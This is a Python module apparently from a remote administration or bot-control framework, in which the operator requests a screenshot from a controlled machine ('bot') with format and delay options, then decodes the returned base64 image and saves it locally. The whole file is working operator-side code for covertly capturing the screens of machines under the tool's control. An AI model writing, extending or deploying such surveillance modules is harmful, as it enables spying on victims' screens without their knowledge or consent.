# -*- coding: utf-8 -*-
__author__ = "Marten4n6", "Cline"
__license__ = "GPLv3"

from server.modules.helper import *
from base64 import b64decode
from os import mkdir


class Module(ModuleABC):
    def get_info(self):
        return {
            "Author": ["Marten4n6", "Cline"],
            "Description": "Take a screenshot with format and delay options",
            "References": [],
            "Stoppable": False
        }

    def get_setup_messages(self):
        return [
            "Local output name (Leave empty for <RANDOM>): ",
            "Format (png/jpg, leave empty for png): ",
            "Delay in seconds before capture (leave empty for 0): "
        ]

    def setup(self, set_options):
        output_name = set_options[0]
        fmt = "png"
        delay = 0

        if len(set_options) > 1:
            fmt = set_options[1].lower()
        if len(set_options) > 2:
            delay = set_options[2]

        if fmt not in ["png", "jpg"]:
            fmt = "png"
        if str(delay).isdigit():
            delay = int(delay)
        else:
            delay = 0

        if not output_name:
            output_name = random_string(8) + "." + fmt
        elif "." not in output_name:
            output_name = output_name + "." + fmt

        return True, {
            "response_options": {
                "output_name": output_name
            },
            "delay": delay
        }

    def process_response(self, response, response_options):
        output_name = (response_options or {}).get("output_name", "screenshot.png")
        output_file = path.join(OUTPUT_DIRECTORY, output_name)

        self._view.output_separator()

        # The bot prints the raw base64 of the capture; anything else means the
        # capture failed on its side (missing screencapture, no permission, ...).
        if isinstance(response, bytes):
            payload = response.strip()
        else:
            payload = str(response or "").strip().encode()

        if not payload:
            self._view.display_error("No screenshot data was returned by the bot.")
            return

        try:
            image_data = b64decode(payload, validate=True)
        except Exception:
            self._view.display_error(
                "The bot did not return valid screenshot data: {}".format(
                    payload[:200].decode("utf-8", errors="replace")
                )
            )
            return

        if not image_data:
            self._view.display_error("The bot returned an empty screenshot.")
            return

        if not path.isdir(OUTPUT_DIRECTORY):
            mkdir(OUTPUT_DIRECTORY)

        with open(output_file, "wb") as open_file:
            open_file.write(image_data)

        self._view.output("Screenshot saved to: {}".format(path.realpath(output_file)), "info")
